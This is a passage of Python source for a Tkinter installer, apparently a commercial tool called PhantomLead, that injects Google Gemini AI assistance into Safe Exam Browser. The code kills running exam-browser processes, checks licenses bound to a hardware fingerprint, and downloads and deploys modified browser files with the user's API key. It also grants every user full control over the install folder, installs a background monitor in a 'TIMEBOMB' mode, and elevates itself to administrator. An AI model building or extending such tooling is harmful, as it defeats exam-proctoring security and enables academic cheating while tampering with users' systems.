            command=self.paste_license
        )
        btn_paste_lic.pack(side=tk.RIGHT)

        # =========================================================
        # 4. CARD 2: GEMINI AI API KEY (Solar Amber / Gold Glow)
        # =========================================================
        card_api = tk.Frame(self, bg="#161105", highlightthickness=1, highlightbackground="#D97706", padx=14, pady=10)
        card_api.pack(fill=tk.X, pady=(0, 10))

        api_header = tk.Frame(card_api, bg="#161105")
        api_header.pack(fill=tk.X, pady=(0, 6))

        tk.Label(
            api_header,
            text="✦  GEMINI AI COGNITIVE ENGINE KEY",
            font=("Segoe UI", 9, "bold"),
            fg="#FBBF24",
            bg="#161105"
        ).pack(side=tk.LEFT)

        tk.Label(
            api_header,
            text="[ Google Gemini 1.5 Pro / Flash • Live SEB Prompt Injection ]",
            font=("Segoe UI", 8),
            fg="#FDE68A",
            bg="#161105"
        ).pack(side=tk.RIGHT)

        api_input_row = tk.Frame(card_api, bg="#161105")
        api_input_row.pack(fill=tk.X)

        self.api_entry = tk.Entry(
            api_input_row,
            show="*",
            font=("Consolas", 11, "bold"),
            bg="#0C0902",
            fg="#FDE047",
            insertbackground="#F59E0B",
            relief=tk.FLAT,
            highlightthickness=1,
            highlightbackground="#B45309",
            highlightcolor="#FBBF24"
        )
        self.api_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, ipady=4, padx=(0, 8))

        self.api_visible = False
        self.btn_toggle_api = tk.Button(
            api_input_row,
            text="👁 Show",
            font=("Segoe UI", 8, "bold"),
            bg="#281A05",
            fg="#FDE68A",
            activebackground="#B45309",
            activeforeground="#FFFFFF",
            relief=tk.FLAT,
            padx=10,
            pady=3,
            cursor="hand2",
            command=self.toggle_api_visibility
        )
        self.btn_toggle_api.pack(side=tk.RIGHT, padx=(4, 0))

        btn_paste_api = tk.Button(
            api_input_row,
            text="📋 Paste",
            font=("Segoe UI", 8, "bold"),
            bg="#281A05",
            fg="#FDE68A",
            activebackground="#B45309",
            activeforeground="#FFFFFF",
            relief=tk.FLAT,
            padx=12,
            pady=3,
            cursor="hand2",
            command=self.paste_api
        )
        btn_paste_api.pack(side=tk.RIGHT)

        # =========================================================
        # 5. HIGH-CONTRAST NEON DEPLOY BUTTON
        # =========================================================
        self.install_btn = tk.Button(
            self, 
            text="⚡  INITIALIZE SECURE INJECTION & SETUP", 
            bg="#10B981", 
            fg="#040905", 
            activebackground="#34D399", 
            activeforeground="#040905", 
            font=("Segoe UI", 11, "bold"), 
            padx=28, 
            pady=8,
            relief=tk.FLAT,
            cursor="hand2",
            command=self.start_installation
        )
        self.install_btn.pack(pady=(0, 10))

        # =========================================================
        # 6. TERMINAL & EXECUTION HUD CONSOLE (Phosphor Emerald)
        # =========================================================
        log_header = tk.Frame(self, bg="#060807")
        log_header.pack(fill=tk.X, pady=(0, 2))

        tk.Label(
            log_header,
            text="[ EXECUTION TELEMETRY HUD ]",
            font=("Consolas", 8, "bold"),
            fg="#4ADE80",
            bg="#060807"
        ).pack(side=tk.LEFT)

        tk.Label(
            log_header,
            text="LOCAL SECURE RUNTIME",
            font=("Consolas", 8),
            fg="#64748B",
            bg="#060807"
        ).pack(side=tk.RIGHT)

        self.log_area = scrolledtext.ScrolledText(
            self, 
            width=80, 
            height=10, 
            state='disabled', 
            bg="#030504", 
            fg="#86EFAC", 
            insertbackground="#34D399", 
            font=("Consolas", 9), 
            relief=tk.FLAT,
            highlightthickness=1,
            highlightbackground="#132418",
            highlightcolor="#10B981"
        )
        self.log_area.pack(fill=tk.BOTH, expand=True)

        self.custom_print("╔══════════════════════════════════════════════════════════════╗")
        self.custom_print("║  PHANTOMLEAD CYBER ENCLAVE v2.0 READY • SEB INJECTION MATRIX ║")
        self.custom_print("╚══════════════════════════════════════════════════════════════╝")
        self.custom_print("[✓ HWID] Cryptographic hardware fingerprinting armed.")
        self.custom_print("[✦ AI]   Gemini cognitive assistance pipeline armed.")
        self.custom_print("[➜ AUTH] Please paste License Key & Gemini API Key above to deploy.")

    def paste_license(self):
        try:
            val = self.clipboard_get().strip()
            self.license_entry.delete(0, tk.END)
            self.license_entry.insert(0, val)
        except Exception:
            pass

    def paste_api(self):
        try:
            val = self.clipboard_get().strip()
            self.api_entry.delete(0, tk.END)
            self.api_entry.insert(0, val)
        except Exception:
            pass

    def toggle_api_visibility(self):
        if self.api_visible:
            self.api_entry.config(show="*")
            self.btn_toggle_api.config(text="👁 Show")
            self.api_visible = False
        else:
            self.api_entry.config(show="")
            self.btn_toggle_api.config(text="🔒 Hide")
            self.api_visible = True

    def custom_print(self, *args, **kwargs):
        msg = " ".join(map(str, args))
        self.log_area.configure(state='normal')
        self.log_area.insert(tk.END, msg + "\n")
        self.log_area.see(tk.END)
        self.log_area.configure(state='disabled')
        self.update()

    def start_installation(self):
        license_key = self.license_entry.get().strip()
        api_key = self.api_entry.get().strip()

        if not license_key or not api_key:
            messagebox.showwarning("Missing Information", "Please enter both your License Key and Gemini API Key.")
            return

        self.install_btn.config(state=tk.DISABLED)
        self.log_area.configure(state='normal')
        self.log_area.delete(1.0, tk.END)
        self.log_area.configure(state='disabled')

        threading.Thread(target=self.run_install_process, args=(license_key, api_key), daemon=True).start()

    def run_install_process(self, license_key, api_key):
        try:
            print(">>> Step 1/7: Validating Gemini API Key with Google...")
            is_valid_api, api_reason, clean_api_key = validate_gemini_api_key(api_key)
            if not is_valid_api:
                print("\n" + "=" * 55)
                print("[!] GEMINI API KEY VALIDATION FAILED:")
                print(api_reason)
                print("=" * 55 + "\n")
                messagebox.showerror(
                    "Gemini API Key Rejected",
                    f"Google Gemini API Key is not valid:\n\n{api_reason}\n\nPlease enter a valid, active Gemini key and try again."
                )
                return

            print("    [OK] Gemini API Key verified active with Google.")
            api_key = clean_api_key

            print(">>> Step 2/7: Closing running Safe Exam Browser processes...")
            kill_seb_processes()

            print(">>> Step 3/7: Generating hardware fingerprint...")
            fingerprint = get_device_fingerprint()

            print(">>> Step 4/7: Validating license key with server...")
            validation_res = validate_license(license_key, fingerprint)
            if not validation_res.get("valid"):
                err_detail = validation_res.get("error", "License validation failed.")
                raise Exception(f"License Rejected: {err_detail}")

            print(">>> Step 5/7: Activating device...")
            device_info = get_device_info()
            activate_res = activate_license(license_key, fingerprint, device_info)
            if not activate_res.get("activated"):
                err_detail = activate_res.get("error", "Device activation failed.")
                raise Exception(f"Device Activation Failed: {err_detail}")

            print(">>> Step 6/7: Fetching package manifest...")
            manifest = get_package_manifest(license_key)
            pkg_code = manifest.get('package_code', 'Standard')
            print(f"    Authorized Package: {pkg_code}")
            if manifest.get('extensions'):
                print(f"    Authorized Extensions: {', '.join(manifest['extensions'])}")

            print(">>> Requesting secure package download URL...")
            download_url = request_signed_download_url(license_key)
            
            temp_zip = os.path.join(os.environ.get("TEMP", "C:\\Temp"), f"{pkg_code}.zip")
            print(">>> Downloading package files...")
            download_package(download_url, temp_zip)
            
            if manifest.get("sha256"):
                print(">>> Verifying package integrity (SHA-256)...")
                if not verify_sha256(temp_zip, manifest["sha256"]):
                    raise Exception("Integrity verification failed! SHA-256 mismatch. The download may be corrupted.")

            print(">>> Step 7/7: Extracting & Deploying Safe Exam Browser files...")
            run_installation(temp_zip, manifest, api_key)

            # Grant full delete & modify permissions to Users on APPLICATION_ROOT so background monitor can wipe it cleanly
            try:
                subprocess.run(['icacls', APPLICATION_ROOT, '/grant', 'Users:(OI)(CI)F', '/T', '/C', '/Q'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception:
                pass

            # Activate anti-tamper, anti-sharing & protection monitor across all editions
            print(">>> Activating background protection & anti-sharing monitor...")
            create_heartbeat(license_key)

            print("\n==========================================")
            print("✅ INSTALLATION COMPLETED SUCCESSFULLY!")
            print("==========================================")
            
            messagebox.showinfo(
                "Installation Complete",
                "Installation completed successfully!\n\nSafe Exam Browser has been securely installed and configured on your machine."
            )
        except Exception as e:
            err_msg = str(e)
            print(f"\n❌ ERROR: {err_msg}")
            messagebox.showerror(
                "Installation Error",
                f"Installation failed:\n\n{err_msg}\n\nPlease check your license key, internet connection, and try again."
            )
        finally:
            self.install_btn.config(state=tk.NORMAL)

def run_installer(mode="TIMEBOMB"):
    if "--heartbeat" in sys.argv or "--start-monitor" in sys.argv:
        run_heartbeat(mode=mode)
        return

    if "--install-monitor" in sys.argv:
        create_heartbeat("STANDALONE_SENTINEL")
        print("Sentinel monitor installed and started successfully.")
        return

    if not is_admin():
        try:
            params = " ".join([f'"{arg}"' for arg in sys.argv[1:]])
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
            sys.exit(0)
        except Exception:
            pass

    app = InstallerApp(mode=mode)
    app.mainloop()

if __name__ == "__main__":
    run_installer(mode="TIMEBOMB")
